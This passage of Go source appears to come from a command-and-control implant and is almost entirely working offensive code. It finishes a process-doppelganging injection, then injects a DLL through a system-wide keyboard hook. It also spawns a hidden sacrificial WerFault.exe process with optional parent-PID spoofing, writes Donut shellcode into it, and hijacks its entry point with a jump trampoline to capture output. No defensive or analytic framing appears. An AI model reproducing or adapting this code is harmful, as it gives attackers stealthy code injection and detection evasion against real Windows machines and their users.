		return nil, fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%x", ret)
	}
	defer windows.CloseHandle(hThread)

	// Step 14: Resume thread to execute
	ret, _, _ = procNtResumeThread.Call(
		uintptr(hThread),
		0,
	)

	if ret != 0 {
		windows.TerminateProcess(hProcess, 1)
		return nil, fmt.Errorf("NtResumeThread failed: NTSTATUS 0x%x", ret)
	}

	result := map[string]interface{}{
		"status":       "success",
		"method":       "process_doppelganging",
		"target_path":  targetPath,
		"pid":          pbi.UniqueProcessId,
		"image_base":   fmt.Sprintf("0x%x", imageBase),
		"entry_point":  fmt.Sprintf("0x%x", entryPoint),
		"payload_size": len(payloadBytes),
		"note":         "Process created from transacted file section (file never existed on disk)",
	}

	return json.Marshal(result)
}

// InjectViaWindowHook injects via SetWindowsHookEx (UI thread only)
func (i *Implant) InjectViaWindowHook(pid int, dllPath string) ([]byte, error) {
	if dllPath == "" {
		return nil, fmt.Errorf("no DLL path provided")
	}

	// Load user32.dll
	user32 := windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookEx := user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx := user32.NewProc("UnhookWindowsHookEx")

	// Load the DLL
	hDll, err := windows.LoadLibrary(dllPath)
	if err != nil {
		return nil, fmt.Errorf("LoadLibrary failed: %v", err)
	}
	defer windows.FreeLibrary(hDll)

	// Get address of hook procedure (must be exported from DLL)
	// Typically named "HookProc" or similar
	hookProc, err := windows.GetProcAddress(hDll, "HookProc")
	if err != nil {
		return nil, fmt.Errorf("GetProcAddress failed: %v", err)
	}

	// Set hook (WH_KEYBOARD = 2)
	hHook, _, err := procSetWindowsHookEx.Call(
		2, // WH_KEYBOARD
		hookProc,
		uintptr(hDll),
		0, // dwThreadId (0 = all threads)
	)

	if hHook == 0 {
		return nil, fmt.Errorf("SetWindowsHookEx failed: %v", err)
	}

	// Keep hook active briefly
	time.Sleep(2 * time.Second)

	// Unhook
	procUnhookWindowsHookEx.Call(hHook)

	result := map[string]interface{}{
		"status":   "success",
		"method":   "windows_hook_injection",
		"dll_path": dllPath,
		"hook_id":  fmt.Sprintf("0x%x", hHook),
		"note":     "DLL injected via SetWindowsHookEx",
	}

	return json.Marshal(result)
}

// MemoryProtectionUtils provides utilities for memory manipulation

// ChangeMemoryProtection changes memory protection of a region
func ChangeMemoryProtection(hProcess windows.Handle, addr uintptr, size int, protection uint32) (uint32, error) {
	var oldProtect uint32
	ret, _, err := procVirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(size),
		uintptr(protection),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return 0, err
	}

	return oldProtect, nil
}

// FlushInstructionCache flushes instruction cache after code modification
func FlushInstructionCache(hProcess windows.Handle, addr uintptr, size int) error {
	procFlushInstructionCache := kernel32.NewProc("FlushInstructionCache")

	ret, _, err := procFlushInstructionCache.Call(
		uintptr(hProcess),
		addr,
		uintptr(size),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// ZeroMemory securely zeros a memory region
func ZeroMemory(addr uintptr, size int) {
	for i := 0; i < size; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = 0
	}
}

// DuplicateHandle duplicates a handle to another process
func DuplicateHandleToProcess(sourceProcess, targetProcess windows.Handle, sourceHandle windows.Handle) (windows.Handle, error) {
	var targetHandle windows.Handle

	err := windows.DuplicateHandle(
		sourceProcess,
		sourceHandle,
		targetProcess,
		&targetHandle,
		0,
		false,
		windows.DUPLICATE_SAME_ACCESS,
	)

	if err != nil {
		return 0, err
	}

	return targetHandle, nil
}

// getMainThreadID gets the first thread ID of a process
// This is needed to resume the main thread of a suspended process
func getMainThreadID(pid uint32) (uint32, error) {
	// Create snapshot of all threads in the system
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPTHREAD),
		0,
	)
	if snapshot == 0 || snapshot == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	// Prepare thread entry structure
	var te THREADENTRY32
	te.DwSize = uint32(unsafe.Sizeof(te))

	// Get first thread
	ret, _, err := procThread32First.Call(
		snapshot,
		uintptr(unsafe.Pointer(&te)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("Thread32First failed: %v", err)
	}

	// Iterate through threads to find the first one belonging to our process
	for {
		if te.Th32OwnerProcessID == pid {
			return te.Th32ThreadID, nil
		}

		// Get next thread
		ret, _, err = procThread32Next.Call(
			snapshot,
			uintptr(unsafe.Pointer(&te)),
		)
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("no thread found for PID %d", pid)
}

// SpawnInjectAndWait spawns a sacrificial process, injects Donut shellcode via CreateRemoteThread,
// waits for completion, and captures STDOUT/STDERR output.
// This implements the Merlin C2 approach for sacrificial process execute-assembly.
//
// Flow: CreateProcess(SUSPENDED) → VirtualAllocEx → WriteProcessMemory →
//
//	VirtualProtectEx(RX) → CreateRemoteThread → ResumeThread → Wait + Capture Output
//
// Parameters:
//
//	processPath: Path to sacrificial process (default: dllhost.exe)
//	shellcode: Donut-generated shellcode containing CLR loader + .NET assembly
//	ppid: If non-zero, use PPID spoofing with this parent PID
func (i *Implant) SpawnInjectAndWait(processPath string, commandLine string, shellcode []byte, ppid int) ([]byte, error) {
	if processPath == "" {
		processPath = "C:\\Windows\\System32\\WerFault.exe"
	}

	if commandLine == "" {
		commandLine = fmt.Sprintf("\"%s\"", processPath)
	}

	commandLineUTF16, err := windows.UTF16FromString(commandLine)
	if err != nil {
		return nil, err
	}
	cmdLinePtr := &commandLineUTF16[0]

	// Create pipes for stdout and stderr
	var stdoutRead, stdoutWrite windows.Handle
	var stderrRead, stderrWrite windows.Handle

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle:      1,
		SecurityDescriptor: nil,
	}

	logDebug("Creating anonymous pipes...")
	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
		return nil, fmt.Errorf("failed to create stdout pipe: %v", err)
	}
	logDebug(fmt.Sprintf("Created STDOUT pipe: read=%v, write=%v", stdoutRead, stdoutWrite))
	// Don't use defer - we manually close handles after reading

	if err := windows.CreatePipe(&stderrRead, &stderrWrite, &sa, 0); err != nil {
		windows.CloseHandle(stdoutRead)
		windows.CloseHandle(stdoutWrite)
		return nil, fmt.Errorf("failed to create stderr pipe: %v", err)
	}
	logDebug(fmt.Sprintf("Created STDERR pipe: read=%v, write=%v", stderrRead, stderrWrite))
	// Don't use defer - we manually close handles after reading

	// Ensure child process doesn't inherit read ends
	windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0)
	windows.SetHandleInformation(stderrRead, windows.HANDLE_FLAG_INHERIT, 0)
	logDebug("Set pipe read ends to non-inheritable")

	var si windows.StartupInfo
	var pi windows.ProcessInformation

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE
	si.StdInput = windows.InvalidHandle // No stdin needed for execute-assembly
	si.StdOutput = stdoutWrite
	si.StdErr = stderrWrite

	processPathPtr, err := syscall.UTF16PtrFromString(processPath)
	if err != nil {
		return nil, err
	}

	// Use PPID spoofing if requested
	var createErr error
	if ppid != 0 {
		// PPID spoofing path
		parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
		if err != nil {
			return nil, fmt.Errorf("failed to open parent process %d: %v", ppid, err)
		}
		defer windows.CloseHandle(parentHandle)

		// Initialize extended startup info for PPID spoofing
		var siEx STARTUPINFOEX
		siEx.StartupInfo = si
		siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))

		// Initialize and configure attribute list
		var size uintptr
		procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))

		addr, err := windows.VirtualAlloc(0, size, windows.MEM_COMMIT, windows.PAGE_READWRITE)
		if err != nil {
			return nil, fmt.Errorf("failed to allocate attribute list: %v", err)
		}
		siEx.lpAttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(addr))
		defer windows.VirtualFree(addr, 0, windows.MEM_RELEASE)

		ret, _, _ := procInitializeProcThreadAttributeList.Call(
			uintptr(unsafe.Pointer(siEx.lpAttributeList)),
			1,
			0,
			uintptr(unsafe.Pointer(&size)),
		)
		if ret == 0 {
			return nil, fmt.Errorf("failed to initialize attribute list")
		}
		defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(siEx.lpAttributeList)))

		ret, _, _ = procUpdateProcThreadAttribute.Call(
			uintptr(unsafe.Pointer(siEx.lpAttributeList)),
			0,
			PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
			uintptr(parentHandle),
			unsafe.Sizeof(parentHandle),
			0,
			0,
		)
		if ret == 0 {
			return nil, fmt.Errorf("failed to update proc thread attribute")
		}

		ret, _, lastErr := procCreateProcessW.Call(
			uintptr(unsafe.Pointer(processPathPtr)),
			uintptr(unsafe.Pointer(cmdLinePtr)),
			0,
			0,
			1, // inherit handles
			windows.CREATE_SUSPENDED|windows.EXTENDED_STARTUPINFO_PRESENT,
			0,
			0,
			uintptr(unsafe.Pointer(&siEx)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if ret == 0 {
			createErr = fmt.Errorf("CreateProcess failed: %v", lastErr)
		}
	} else {
		// Standard process creation (Merlin's approach: STARTF_USESHOWWINDOW + SW_HIDE for hiding)
		createErr = windows.CreateProcess(
			processPathPtr,
			cmdLinePtr,
			nil,
			nil,
			true, // inherit handles
			windows.CREATE_SUSPENDED,
			nil,
			nil,
			&si,
			&pi,
		)
	}

	if createErr != nil {
		return nil, fmt.Errorf("failed to create process: %v", createErr)
	}
	logDebug(fmt.Sprintf("Process created successfully: PID=%d, Process=%v, Thread=%v", pi.ProcessId, pi.Process, pi.Thread))

	// Inject shellcode and hijack entry point (Merlin approach for output capture)
	// Entry point hijacking is REQUIRED for pipe output capture because:
	// - Inherited STDOUT/STDERR handles are only accessible by the main thread
	// - CreateRemoteThread creates a new thread without handle access
	// - Entry point hijacking ensures main thread executes shellcode with handles

	logDebug("Allocating memory in child process...")
	addr, vErr := virtualAllocEx(pi.Process, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if vErr != nil {
		windows.TerminateProcess(pi.Process, 1)
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", vErr)
	}
	logDebug(fmt.Sprintf("Allocated %d bytes at address 0x%x", len(shellcode), addr))

	var bytesWritten uintptr
	ret, _, wErr := procWriteProcessMemory.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		virtualFreeEx(pi.Process, addr, 0, MEM_RELEASE)
		windows.TerminateProcess(pi.Process, 1)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", wErr)
	}

	// Change memory protection to PAGE_EXECUTE_READ
	var oldProtect uint32
	ret, _, _ = procVirtualProtectEx.Call(
		uintptr(pi.Process),
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Hijack entry point (REQUIRED with Thread: 0 for handle inheritance)
	logDebug("Hijacking entry point...")
	err = hijackEntryPoint(pi.Process, addr)
	if err != nil {
		virtualFreeEx(pi.Process, addr, 0, MEM_RELEASE)
		windows.TerminateProcess(pi.Process, 1)
		return nil, fmt.Errorf("Entry point hijacking failed: %v", err)
	}
	logDebug("Entry point hijacked successfully")

	// Resume the main thread - it will jump to our shellcode at entry point
	logDebug("Resuming main thread...")
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return nil, fmt.Errorf("ResumeThread failed: %v", err)
	}
	logDebug("Main thread resumed")

	// Wait a moment to see if process crashes immediately
	logDebug("Waiting 2 seconds to check if process is still running...")
	result, _ := windows.WaitForSingleObject(pi.Process, 2000) // Wait 2 seconds
	switch result {
	case 0x00000000: // WAIT_OBJECT_0 - process exited
		var exitCode uint32
		windows.GetExitCodeProcess(pi.Process, &exitCode)
		logDebug(fmt.Sprintf("WARNING: Process exited within 2 seconds! Exit code: 0x%x (%d)", exitCode, exitCode))
	case 0x00000102: // WAIT_TIMEOUT - still running
		logDebug("Process still running after 2 seconds - good sign")
	default:
		logDebug(fmt.Sprintf("WaitForSingleObject returned: 0x%x", result))
	}

	// Close process and thread handles immediately (Merlin's pattern - lines 539-548)
	// Pipes will remain open until child process exits
	logDebug("Closing process and thread handles...")
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	logDebug("Process and thread handles closed")

	// Close write pipe handles AFTER closing process handles (Merlin's pattern - line 551)
	logDebug("Closing write pipe handles...")
	windows.CloseHandle(stdoutWrite)
	windows.CloseHandle(stderrWrite)
	logDebug("Write pipe handles closed - child process should now be only writer")

	// Read from pipes synchronously until they close (Merlin's approach)
	// The pipes will close when the sacrificial process exits
	logDebug("Starting to read from pipes (this will block until child process exits)...")
	var stdoutData []byte
	var stderrData []byte
	buffer := make([]byte, 4096) // Use larger buffer for efficiency

	// Read STDOUT
	logDebug("Reading STDOUT...")
	stdoutReadCount := 0
	for {
		var bytesRead uint32
		err := windows.ReadFile(stdoutRead, buffer, &bytesRead, nil) // nil = synchronous
		if err != nil {
			// Pipe closed or error - stop reading
			logDebug(fmt.Sprintf("STDOUT ReadFile stopped: %v", err))
			break
		}
		if bytesRead == 0 {
			logDebug("STDOUT: bytesRead = 0, stopping")
			break
		}
		stdoutReadCount += int(bytesRead)
		// Append the actual bytes read
		stdoutData = append(stdoutData, buffer[:bytesRead]...)
	}
	logDebug(fmt.Sprintf("STDOUT: Read %d bytes total", stdoutReadCount))

	// Read STDERR
	logDebug("Reading STDERR...")
	stderrReadCount := 0
	for {
		var bytesRead uint32
		err := windows.ReadFile(stderrRead, buffer, &bytesRead, nil) // nil = synchronous
		if err != nil {
			// Pipe closed or error - stop reading
			logDebug(fmt.Sprintf("STDERR ReadFile stopped: %v", err))
			break
		}
		if bytesRead == 0 {
			logDebug("STDERR: bytesRead = 0, stopping")
			break
		}
		stderrReadCount += int(bytesRead)
		// Append the actual bytes read
		stderrData = append(stderrData, buffer[:bytesRead]...)
	}
	logDebug(fmt.Sprintf("STDERR: Read %d bytes total", stderrReadCount))

	// Close pipe handles now that we're done reading
	windows.CloseHandle(stdoutRead)
	windows.CloseHandle(stderrRead)
	// Note: stdoutWrite and stderrWrite were already closed after process creation
	// Note: pi.Process and pi.Thread were already closed after ResumeThread

	// Exit code will be 0 since we don't wait for the process
	var exitCode uint32 = 0

	// Build result
	res := map[string]interface{}{
		"status":          "success",
		"pid":             int(pi.ProcessId),
		"spawned_process": processPath,
		"method":          "spawn_inject_and_wait",
		"exit_code":       exitCode,
		"output":          string(stdoutData),
	}

	if len(stderrData) > 0 {
		res["stderr"] = string(stderrData)
	}

	if ppid != 0 {
		res["ppid_spoofed"] = ppid
	}

	return json.Marshal(res)
}

// hijackEntryPoint modifies the process entry point to jump to shellcode
// This is the REQUIRED technique for execute-assembly with output capture because:
// - STARTF_USESTDHANDLES only provides inherited handles to the MAIN THREAD
// - Entry point hijacking ensures main thread executes shellcode (with handles)
// - Donut with Thread=0 runs assembly in same thread (main thread → has handles → output works!)
func hijackEntryPoint(hProcess windows.Handle, shellcodeAddr uintptr) error {
	// Query process information to get PEB address
	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32

	ret, _, _ := procNtQueryInformationProcess.Call(
		uintptr(hProcess),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if ret != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: 0x%x", ret)
	}

	// Read PEB structure to get ImageBaseAddress (Merlin's exact approach)
	var peb PEB
	var bytesRead uintptr
	ret, _, _ = procReadProcessMemory.Call(
		uintptr(hProcess),
		pbi.PebBaseAddress,
		uintptr(unsafe.Pointer(&peb)),
		unsafe.Sizeof(peb),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return fmt.Errorf("ReadProcessMemory(PEB) failed")
	}

	imageBase := peb.ImageBaseAddress

	// Read DOS header
	var dosHeader IMAGE_DOS_HEADER
	ret, _, _ = procReadProcessMemory.Call(
		uintptr(hProcess),
		imageBase,
		uintptr(unsafe.Pointer(&dosHeader)),
		unsafe.Sizeof(dosHeader),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return fmt.Errorf("ReadProcessMemory(DOS header) failed")
	}

	// Validate MZ signature (Merlin checks for 23117 which is 0x5a4d in decimal)
	if dosHeader.Magic != 23117 { // 0x5a4d = "MZ"
		return fmt.Errorf("invalid DOS signature: 0x%x", dosHeader.Magic)
	}

	// Read NT headers
	ntHeadersAddr := imageBase + uintptr(dosHeader.LfaNew)
	var ntHeaders IMAGE_NT_HEADERS
	ret, _, _ = procReadProcessMemory.Call(
		uintptr(hProcess),
		ntHeadersAddr,
		uintptr(unsafe.Pointer(&ntHeaders)),
		unsafe.Sizeof(ntHeaders),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return fmt.Errorf("ReadProcessMemory(NT headers) failed")
	}

	// Validate PE signature
	if ntHeaders.Signature != 0x4550 { // "PE"
		return fmt.Errorf("invalid PE signature: 0x%x", ntHeaders.Signature)
	}

	// Get entry point RVA
	entryPointRVA := ntHeaders.OptionalHeader.AddressOfEntryPoint
	entryPointAddr := imageBase + uintptr(entryPointRVA)

	// Determine architecture and create trampoline
	var trampoline []byte
	machine := ntHeaders.FileHeader.Machine

	if machine == 0x8664 { // x64
		// x64 trampoline: mov rax, <addr>; jmp rax
		trampoline = []byte{
			0x48, 0xb8, // mov rax, imm64
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // shellcode address (8 bytes)
			0xff, 0xe0, // jmp rax
		}
		// Write shellcode address to bytes 2-9
		binary.LittleEndian.PutUint64(trampoline[2:10], uint64(shellcodeAddr))
	} else if machine == 0x14c { // x86
		// x86 trampoline: mov eax, <addr>; jmp eax
		trampoline = []byte{
			0xb8,                   // mov eax, imm32
			0x00, 0x00, 0x00, 0x00, // shellcode address (4 bytes)
			0xff, 0xe0, // jmp eax
		}
		// Write shellcode address to bytes 1-4
		binary.LittleEndian.PutUint32(trampoline[1:5], uint32(shellcodeAddr))
	} else {
		return fmt.Errorf("unsupported architecture: 0x%x", machine)
	}

	// Write trampoline to entry point (Merlin does this WITHOUT VirtualProtectEx!)
	var bytesWritten uintptr
	ret, _, wErr := procWriteProcessMemory.Call(
		uintptr(hProcess),
		entryPointAddr,
		uintptr(unsafe.Pointer(&trampoline[0])),
		uintptr(len(trampoline)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory(trampoline) failed: %v", wErr)
	}

	return nil
}
